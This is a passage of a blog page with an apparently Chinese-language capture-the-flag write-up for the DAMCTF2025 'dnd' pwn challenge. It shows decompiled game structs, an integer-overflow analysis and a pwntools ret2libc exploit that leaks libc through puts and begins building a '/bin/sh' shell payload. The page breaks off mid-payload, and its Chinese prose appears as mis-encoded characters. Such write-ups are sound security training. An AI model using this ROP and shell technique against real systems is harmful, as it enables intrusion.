<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "åˆ‡æ¢ä¸ºæµ…è‰²ä¸»é¢˜" : "åˆ‡æ¢ä¸ºæ·±è‰²ä¸»é¢˜");
            if (label) {
                label.textContent = isDark ? "æ·±è‰²" : "æµ…è‰²";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>DAMCTF2025 Writeup | èŠ±ç›†</title><meta name="author" content="LittFlower"/><meta property="og:title" content="DAMCTF2025 Writeup | èŠ±ç›†"/><meta property="og:site_name" content="èŠ±ç›†"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/damctf2025-writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="èŠ±ç›†" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>å†…å®¹</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>å›åˆ°é¡¶éƒ¨</a></h3><button type="button" data-theme-toggle="true" aria-label="åˆ‡æ¢äº®æš—ä¸»é¢˜" aria-pressed="false" title="åˆ‡æ¢ä¸»é¢˜" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>Â Â <span data-theme-toggle-label="true" class="theme-toggle-label">æµ…è‰²</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="damctf2025-pwn-writeup" class="scroll-target"><a href="#damctf2025-pwn-writeup"><code class="hash inline-code">#</code>DAMCTF2025 Pwn WriteUp</a></h1>
<p>æœ¬æ¥å‘¨æœ«æƒ³ç€æ‰“é‚£ä¸ª midnight sun CTF2025 æ¥ç€ï¼Œç»“æœæ¨è¿Ÿäº†ï¼Œå°±çœ‹äº†è¿™ä¸€åœº DAMCTF2025 å’Œå¦å¤–ä¸€åœº Break The Syntax CTF2025ã€‚ã€‚</p>
<h2 id="dnd" class="scroll-target"><a href="#dnd"><code class="hash inline-code">#</code>dnd</a></h2>
<p>ç®€å•é€†å‘ä¸€ä¸‹æ¢å¤ç»“æ„ä½“ï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> Game</span><span style="color:#A0ADA0"> // sizeof=0x4</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> point</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000001</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> health</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000002</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> attack</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000003</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> d</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000004</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> Monster</span><span style="color:#A0ADA0"> // sizeof=0x3</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> health</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000001</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> damage</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000002</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> c</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000003</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br></code></pre></div>
<p>æ¢å¤å‡ºæ¥ <code class="inline-code">Monster::attack</code> å‡½æ•°å¦‚ä¸‹ï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#393A34">Game </span><span style="color:#AB5959">*</span><span style="color:#393A34">__fastcall Monster::</span><span style="color:#59873A">Attack</span><span style="color:#2993a3">(</span><span style="color:#393A34">Monster </span><span style="color:#AB5959">*</span><span style="color:#B07D48">monster</span><span style="color:#999999">,</span><span style="color:#393A34"> Game </span><span style="color:#AB5959">*</span><span style="color:#B07D48">you</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 v2</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  Game </span><span style="color:#AB5959">*</span><span style="color:#393A34">result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#393A34">  __int64 v4</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48"> you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">attack</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    v4 </span><span style="color:#999999">=</span><span style="color:#393A34"> std::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">std::cout</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">Oof, that hurt ;(</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    std::ostream::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#a65e2b">(</span><span style="color:#393A34">v4</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">std::endl</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#999999">,</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#AB5959"> -=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">damage</span><span style="color:#999999">;</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#393A34"> you</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">point</span><span style="color:#AB5959"> -=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999">;</span><span style="color:#A0ADA0">              // æ•´æ•°æº¢å‡º</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    v2 </span><span style="color:#999999">=</span><span style="color:#393A34"> std::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">std::cout</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">You defeated the monster!</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    std::ostream::operator</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#a65e2b">(</span><span style="color:#393A34">v2</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">std::endl</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#999999">,</span><span style="color:#393A34">std::char_traits</span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">char</span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">point</span><span style="color:#AB5959"> +=</span><span style="color:#B07D48"> monster</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">health</span><span style="color:#999999">;</span><br><span style="color:#393A34">    result </span><span style="color:#999999">=</span><span style="color:#393A34"> you</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    ++</span><span style="color:#B07D48">you</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">attack</span><span style="color:#999999">;</span><span style="color:#A0ADA0">                              // inc attack</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>åªè¦æŠŠ youâ†’point å˜æˆè´Ÿæ•°</p>
<p><img src="https://pic1.imgdb.cn/item/68215fba58cb8da5c8ecc4de.png" alt="image.png"/></p>
<p>è¿™é‡Œçš„æ¯”è¾ƒç”¨çš„æ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ä¸Šé¢çš„è´Ÿæ•°å¾ˆå®¹æ˜“å°±é€šè¿‡è¿™ä¸ªæ£€æµ‹ã€‚</p>
<p>ç„¶åå°±æ˜¯ä¸€ä¸ªç™½ç»™çš„æ ˆæº¢å‡ºã€‚</p>
<p>é¢˜ç›®çš„äº¤äº’æ¯”è¾ƒæŠ½è±¡ï¼Œæœ¬åœ°ä¸€å¼€å§‹çå†™è¸©äº†å¾ˆå¤šå‘ï¼Œåæ¥é‡å†™äº†ä¸€ä¸‹ï¼Œexpï¼š</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./dnd_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">dnd.chals.damctf.xyz</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 30813</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x402960</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> get_point</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Attack: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    attack </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> (</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    health </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> health</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> attack </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#393A34"> health</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Do you want to [a]ttack or [r]un?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    else</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Do you want to [a]ttack or [r]un?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">>>> Round </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Points: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    points </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> | Health: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> points</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Can you survive all 5 rounds?</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">>>> Round </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Points: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    points </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> | Health: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> get_point</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> res </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> i</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Do you want to [a]ttack or [r]un? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            break</span><br><br><span style="color:#393A34">get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># 0x0000000000402640: pop rdi; nop; pop rbp; ret;</span><br><span style="color:#A0ADA0"># 0x000000000040201a: ret;</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">402640</span><br><span style="color:#393A34">main </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">402988</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40201a</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">cyclic</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">104</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#393A34"> main</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">What is your name, fierce warrior? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io.sendline(payload)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">puts_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> puts_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">87be0</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr</span><br><br><span style="color:#393A34">get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">cyclic</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">104</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh</span><span 